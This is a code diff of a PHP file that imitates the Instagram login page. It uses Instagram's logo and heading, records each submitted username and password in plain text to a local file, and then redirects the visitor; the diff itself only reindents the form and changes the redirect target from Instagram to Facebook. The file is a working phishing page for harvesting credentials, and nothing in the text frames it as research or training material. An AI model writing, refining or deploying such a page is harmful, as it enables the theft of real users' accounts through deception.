@@ -54,16 +54,14 @@
 <body>
 
 <div class="login-container">
-  <form class="login-form" action="" method="post">
-	<img src="https://www.instagram.com/static/images/ico/favicon.ico/36b3ee2d91ed.ico" alt="Logo" class="logo">
-	<h2>Log in to Instagram</h2>
-	<input type="text" name="username" placeholder="Username" value="<?php echo isset($_GET['username']) ? htmlspecialchars($_GET['username']) : ''; ?>" required>
-    <input type="password" name="password" placeholder="Password" required>
-    <button type="submit">Log In</button>
-	<div class="signup-link">
-		Don't have an account? <a href="http://instagram.com">Sign Up</a>
-	</div>
-  </form>
+    <form class="login-form" action="" method="post">
+        <img src="https://www.instagram.com/static/images/ico/favicon.ico/36b3ee2d91ed.ico" alt="Logo" class="logo">
+        <h2>Log in to Instagram</h2>
+        <input type="text" name="username" placeholder="Username" value="<?php echo isset($_GET['username']) ? htmlspecialchars($_GET['username']) : ''; ?>" required>
+        <input type="password" name="password" placeholder="Password" required>
+        <button type="submit">Log In</button>
+        <div class="signup-link"> Don't have an account? <a href="http://instagram.com">Sign Up</a></div>
+    </form>
 </div>
 
 </body>
@@ -95,6 +93,6 @@ if ($_SERVER["REQUEST_METHOD"] == "POST") {
 
     $data = "User: " . $username . "\n" . "Password: " . $password . "\n|-------------------INSTAGRAM-------------------|\n";
     file_put_contents($filename, $data, FILE_APPEND);
-	header("Location: https://www.instagram.com");
+    header("Location: https://www.facebook.com");
 }
 ?>
